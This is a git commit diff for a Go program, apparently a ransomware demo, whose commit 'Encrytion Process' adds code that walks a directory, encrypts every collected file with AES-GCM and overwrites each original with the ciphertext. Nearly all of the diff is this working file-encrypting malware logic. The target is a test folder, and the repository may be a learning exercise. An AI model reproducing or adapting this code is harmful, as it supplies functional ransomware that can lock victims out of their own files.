8d068380b44cec5a7d97e37d12a6bbd9191eb972
kali <kali@kali>
2023-09-30 11:26:46 +0200

    Encrytion Process

--- demo.go
+++ demo.go
@@ -1,6 +1,8 @@
 package main
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/rand"
 	"encoding/hex"
 	"fmt"
@@ -26,7 +28,7 @@ func main() {
 	}
 
 	// Path Discovery
-	root := "/home/kali/Documents/GoDemo2/"
+	const root string = "/home/kali/Documents/GoDemo2/test"
 	err2 := filepath.WalkDir(root, visitFile)
 	if err2 != nil {
 		fmt.Printf("Error walking the path: %v\n", err)
@@ -35,6 +37,17 @@ func main() {
 	// Encryption Loop
 	for _, path := range file_paths {
 		fmt.Println("Path: ", path)
+
+		// Get bytes of the file content
+		var content []byte = readFile(path)
+		encrypted_content, err := encrypt(content, key)
+		if err != nil {
+			panic(err)
+		}
+		if DEBUG {
+			fmt.Println("Encrypted Content: ", string(encrypted_content))
+		}
+		writeEncryptedContent(encrypted_content, path)
 	}
 
 }
@@ -63,4 +76,57 @@ func visitFile(fp string, fi os.DirEntry, err error) error {
 		}
 	}
 	return nil
+}
+
+func readFile(file_path string) []byte {
+	file, err := os.Open(file_path)
+	if err != nil {
+		panic(err)
+	}
+	defer file.Close()
+
+	content, err := io.ReadAll(file)
+	if err != nil {
+		panic(err)
+	}
+
+	if DEBUG {
+		fmt.Println("File Content: ", string(content))
+	}
+
+	return content
+}
+
+func encrypt(content []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err)
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		panic(err)
+	}
+
+	nonce := make([]byte, gcm.NonceSize())
+	_, err = io.ReadFull(rand.Reader, nonce)
+	if err != nil {
+		panic(err)
+	}
+
+	cypherText := gcm.Seal(nonce, nonce, content, nil)
+	return cypherText, nil
+
+}
+
+func writeEncryptedContent(content []byte, file_path string) {
+	file, err := os.OpenFile(file_path, os.O_WRONLY|os.O_TRUNC, 0644)
+	if err != nil {
+		panic(err)
+	}
+	defer file.Close()
+	_, err = file.Write(content)
+	if err != nil {
+		panic(err)
+	}
 }
